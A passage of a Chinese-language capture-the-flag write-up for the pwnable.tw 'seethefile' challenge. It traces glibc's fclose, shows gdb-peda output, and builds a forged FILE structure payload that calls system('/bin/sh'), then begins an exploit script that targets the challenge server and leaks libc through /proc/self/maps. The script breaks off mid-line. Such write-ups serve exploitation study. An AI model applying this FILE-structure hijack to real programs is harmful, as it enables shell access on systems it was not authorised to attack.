functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">         the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> = <span class="title">fp</span>-&gt;_<span class="title">codecvt</span>;</span></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">        _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line">versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);</span><br><span class="line">strong_alias (_IO_new_fclose, __new_fclose)</span><br><span class="line">versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);</span><br></pre></td></tr></table></figure><p>fclose 首先会调用_IO_unlink_it 将指定的 FILE 从_chain 链表中脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>之后会调用_IO_file_close_it 函数，_IO_file_close_it 会调用系统接口 close 关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure><p>最后调用 vtable 中的_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><p>根据调用流程，我们需要fake 一个io file ，所以首先，我们将 fp-&gt; name buffer，因为这是我们可以控制的数据流。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302033603.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302033603.png"></a></p><p>​                       <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302042933.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190302042933.png"></a></p><p>根据调试我们可以知道，我们需要构造的结构如下：</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190303231240.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190303231240.png"></a></p><p>记录下调试过程：</p><ul><li><p>覆盖 *fp</p><p>Payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>此时：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e749eb &lt;_IO_new_fclose+11&gt;:add    ebx,0x154615</span><br><span class="line">   0xf7e749f1 &lt;_IO_new_fclose+17&gt;:sub    esp,0x1c</span><br><span class="line">   0xf7e749f4 &lt;_IO_new_fclose+20&gt;:mov    esi,DWORD PTR [ebp+0x8]</span><br><span class="line">=&gt; 0xf7e749f7 &lt;_IO_new_fclose+23&gt;:cmp    BYTE PTR [esi+0x46],0x0</span><br><span class="line">   0xf7e749fb &lt;_IO_new_fclose+27&gt;:jne    0xf7e74ba0 &lt;_IO_new_fclose+448&gt;</span><br><span class="line">   0xf7e74a01 &lt;_IO_new_fclose+33&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a03 &lt;_IO_new_fclose+35&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a06 &lt;_IO_new_fclose+38&gt;:jne    0xf7e74b80 &lt;_IO_new_fclose+416&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">0004| 0xffffd704 --&gt; 0x0</span><br><span class="line">0008| 0xffffd708 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0012| 0xffffd70c --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">0016| 0xffffd710 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">0020| 0xffffd714 --&gt; 0xf7fee010 (&lt;_dl_runtime_resolve+16&gt;:pop    edx)</span><br><span class="line">0024| 0xffffd718 --&gt; 0xf7e749eb (&lt;_IO_new_fclose+11&gt;:add    ebx,0x154615)</span><br><span class="line">0028| 0xffffd71c --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">_IO_new_fclose (fp=0x804b260 &lt;name&gt;) at iofclose.c:48</span><br><span class="line">48iofclose.c: No such file or directory.</span><br><span class="line">gdb-peda$ telescope <span class="variable">$esi</span>+0x46</span><br><span class="line">0000| 0x804b2a6 --&gt; 0x0</span><br><span class="line">0004| 0x804b2aa --&gt; 0x0</span><br><span class="line">0008| 0x804b2ae --&gt; 0x0</span><br><span class="line">0012| 0x804b2b2 --&gt; 0x0</span><br><span class="line">0016| 0x804b2b6 --&gt; 0x0</span><br><span class="line">0020| 0x804b2ba --&gt; 0x0</span><br><span class="line">0024| 0x804b2be --&gt; 0x0</span><br><span class="line">0028| 0x804b2c2 --&gt; 0x0</span><br></pre></td></tr></table></figure><p><code>cmp    BYTE PTR [esi+0x46],0x0</code> ,  取[esi+0x46] 低位一byte的值，此时值为0，则 CMP 成立，不会跳转。</p></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0xffffffff</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a24 (&lt;_IO_new_fclose+68&gt;:cmp    edi,DWORD PTR [edx+0x8])</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a14 &lt;_IO_new_fclose+52&gt;:jne    0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a1a &lt;_IO_new_fclose+58&gt;:mov    edx,DWORD PTR [esi+0x48]</span><br><span class="line">   0xf7e74a1d &lt;_IO_new_fclose+61&gt;:mov    edi,DWORD PTR gs:0x8</span><br><span class="line">=&gt; 0xf7e74a24 &lt;_IO_new_fclose+68&gt;:cmp    edi,DWORD PTR [edx+0x8]</span><br><span class="line">   0xf7e74a27 &lt;_IO_new_fclose+71&gt;:je     0xf7e74a4f &lt;_IO_new_fclose+111&gt;</span><br><span class="line">   0xf7e74a29 &lt;_IO_new_fclose+73&gt;:xor    eax,eax</span><br><span class="line">   0xf7e74a2b &lt;_IO_new_fclose+75&gt;:mov    ecx,0x1</span><br><span class="line">   0xf7e74a30 &lt;_IO_new_fclose+80&gt;:cmp    DWORD PTR gs:0xc,0x0</span><br></pre></td></tr></table></figure><p>  紧接着，<code>cmp    edi,DWORD PTR [edx+0x8]</code>在此处会发生报错，因为此时 edx 为 0 ，由上下文我们知道，</p><p>  <code>    mov    edx,DWORD PTR [esi+0x48]</code>, edx 由，[esi+0x48] 赋值，因此我们需要将[esi+0x48]设置成一个可读地址，esi 此时 fp 地址，所以我们修改 payload为如下</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>  因为后面有以下操作：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x6e69622f (<span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">EBX: 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0x804b270 --&gt; 0x1</span><br><span class="line">ESI: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EDI: 0xf7e16700 (0xf7e16700)</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd700 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:add    esi,0x15815)</span><br><span class="line">EIP: 0xf7e74a53 (&lt;_IO_new_fclose+115&gt;:mov    edx,eax)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e74a4a &lt;_IO_new_fclose+106&gt;:mov    eax,DWORD PTR [esi]</span><br><span class="line">   0xf7e74a4c &lt;_IO_new_fclose+108&gt;:mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">   0xf7e74a4f &lt;_IO_new_fclose+111&gt;:add    DWORD PTR [edx+0x4],0x1</span><br><span class="line">=&gt; 0xf7e74a53 &lt;_IO_new_fclose+115&gt;:mov    edx,eax</span><br><span class="line">   0xf7e74a55 &lt;_IO_new_fclose+117&gt;:and    edx,0x8000</span><br><span class="line">   0xf7e74a5b &lt;_IO_new_fclose+123&gt;:<span class="built_in">test</span>   ah,0x20</span><br><span class="line">   0xf7e74a5e &lt;_IO_new_fclose+126&gt;:je     0xf7e74aa8 &lt;_IO_new_fclose+200&gt;</span><br><span class="line">   0xf7e74a60 &lt;_IO_new_fclose+128&gt;:sub    esp,0xc</span><br></pre></td></tr></table></figure><p>  此时 </p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xf7e74a4c &lt;_IO_new_fclose+108&gt;:mov    DWORD PTR [edx+0x8],edi</span><br><span class="line">0xf7e74a4f &lt;_IO_new_fclose+111&gt;:add    DWORD PTR [edx+0x4],0x1</span><br></pre></td></tr></table></figure><p>  edx 为 fp+0x48 后的地址，此时如果也将 赋值为 buffer 地址，会修改掉 fp 的内容，所以我们随便往后偏移0x10</p><ul><li><p>控制程序流程</p><p> 接着调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">EAX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">EBX: 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0x0</span><br><span class="line">ESI: 0x0</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd728 --&gt; 0xffffd778 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd6e0 --&gt; 0xf7fc9000 --&gt; 0x1b1db0</span><br><span class="line">EIP: 0xf7e80910 (&lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46])</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e8090c &lt;_IO_new_file_close_it+252&gt;:pop    edi</span><br><span class="line">   0xf7e8090d &lt;_IO_new_file_close_it+253&gt;:ret</span><br><span class="line">   0xf7e8090e &lt;_IO_new_file_close_it+254&gt;:xchg   ax,ax</span><br><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure><p>我们此时跟到 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0xf7e80910 &lt;_IO_new_file_close_it+256&gt;:movsx  eax,BYTE PTR [ebx+0x46]</span><br><span class="line">   0xf7e80914 &lt;_IO_new_file_close_it+260&gt;:sub    esp,0xc</span><br><span class="line">   0xf7e80917 &lt;_IO_new_file_close_it+263&gt;:mov    eax,DWORD PTR [ebx+eax*1+0x94]</span><br><span class="line">   0xf7e8091e &lt;_IO_new_file_close_it+270&gt;:push   ebx</span><br><span class="line">   0xf7e8091f &lt;_IO_new_file_close_it+271&gt;:call   DWORD PTR [eax+0x44]</span><br></pre></td></tr></table></figure><p>如果此时控制 eax ，我们则能控制程序流程，关键在于 ebx 和 eax 两个寄存器</p><p><code>movsx  eax,BYTE PTR [ebx+0x46]</code> —&gt; eax == 0</p><p><code>mov    eax,DWORD PTR [ebx+eax*1+0x94]</code> —&gt; eax = [ebx+0x94] ;ebx 此时为 fp 地址。</p><p>则此时， eax = fp + 0x94</p><p>我们要控制的跳转地址为  eax = [[fp+0x94]+0x44]</p><p>所以我们设置如下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure></li></ul><p>  构造出来的file 结构如下：</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x804b260 0x94</span><br><span class="line">0000| 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0004| 0x804b264 --&gt; 0x68732f (<span class="string">&#x27;/sh&#x27;</span>)</span><br><span class="line">0008| 0x804b268 --&gt; 0x0 </span><br><span class="line">0012| 0x804b26c --&gt; 0x0 </span><br><span class="line">0016| 0x804b270 --&gt; 0x0 </span><br><span class="line">0020| 0x804b274 --&gt; 0x0 </span><br><span class="line">0024| 0x804b278 --&gt; 0x0 </span><br><span class="line">0028| 0x804b27c --&gt; 0x0 </span><br><span class="line">0032| 0x804b280 --&gt; 0x804b260 (<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">0036| 0x804b284 --&gt; 0x0 </span><br><span class="line">0040| 0x804b288 --&gt; 0x0 </span><br><span class="line">0044| 0x804b28c --&gt; 0x0 </span><br><span class="line">0048| 0x804b290 --&gt; 0x0 </span><br><span class="line">0052| 0x804b294 --&gt; 0x0 </span><br><span class="line">0056| 0x804b298 --&gt; 0x0 </span><br><span class="line">0060| 0x804b29c --&gt; 0x0 </span><br><span class="line">0064| 0x804b2a0 --&gt; 0x0 </span><br><span class="line">0068| 0x804b2a4 --&gt; 0x0 </span><br><span class="line">0072| 0x804b2a8 --&gt; 0x804b270 --&gt; 0x0 </span><br><span class="line">0076| 0x804b2ac --&gt; 0x0 </span><br><span class="line">0080| 0x804b2b0 --&gt; 0x0 </span><br><span class="line">0084| 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0088| 0x804b2b8 --&gt; 0x0 </span><br><span class="line">0092| 0x804b2bc --&gt; 0x0 </span><br><span class="line">0096| 0x804b2c0 --&gt; 0x0 </span><br><span class="line">--More--(25/148)</span><br><span class="line">0100| 0x804b2c4 --&gt; 0x0 </span><br><span class="line">0104| 0x804b2c8 --&gt; 0x0 </span><br><span class="line">0108| 0x804b2cc --&gt; 0x0 </span><br><span class="line">0112| 0x804b2d0 --&gt; 0x0 </span><br><span class="line">0116| 0x804b2d4 --&gt; 0x0 </span><br><span class="line">0120| 0x804b2d8 --&gt; 0x0 </span><br><span class="line">0124| 0x804b2dc --&gt; 0x0 </span><br><span class="line">0128| 0x804b2e0 --&gt; 0x0 </span><br><span class="line">0132| 0x804b2e4 --&gt; 0x0 </span><br><span class="line">0136| 0x804b2e8 --&gt; 0x0 </span><br><span class="line">0140| 0x804b2ec --&gt; 0x0 </span><br><span class="line">0144| 0x804b2f0 --&gt; 0x0 </span><br><span class="line">0148| 0x804b2f4 --&gt; 0x804b2b4 --&gt; 0x0 </span><br><span class="line">0152| 0x804b2f8 --&gt; 0xf7e51da0 (&lt;__libc_system&gt;:sub    esp,0xc)</span><br><span class="line">0156| 0x804b2fc --&gt; 0x0 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  最后的 infoleak 只需要 读 <code>/proc/self/map</code> 即可</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> swpwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;15111&#x27;, &#x27;-t&#x27;, &#x27;OSXTerminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;python&#x27;, &#x27;/pwn/notiterm.py&#x27;, &#x27;-p&#x27;, &#x27;23333&#x27;, &#x27;-t&#x27;, &#x27;terminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;/pwn/notiterm.py&#x27;</span>,<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;iterm&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io,elf,libc = init_pwn(<span class="string">&quot;./seethefile&quot;</span>,<span class="string">&quot;libc_32.so.6&quot;</span>,remote_detail = (<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>),is_env = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 1. Open</span></span><br><span class="line">  <span class="comment"># 2. Read</span></span><br><span class="line">  <span class="comment"># 3. Write to screen</span></span><br><span class="line">  <span class="comment"># 4. Close</span></span><br><span class="line">  <span class="comment"># 5. Exit</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">nm</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(nm)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## -------- read remote libc ---------</span></span><br><span class="line"><span class="comment"># read_file(&#x27;/proc/self/maps&#x27;)</span></span><br><span class="line"><span class="comment"># libc_addr = io.recvuntil(&quot;r-xp&quot;)</span></span><br><span 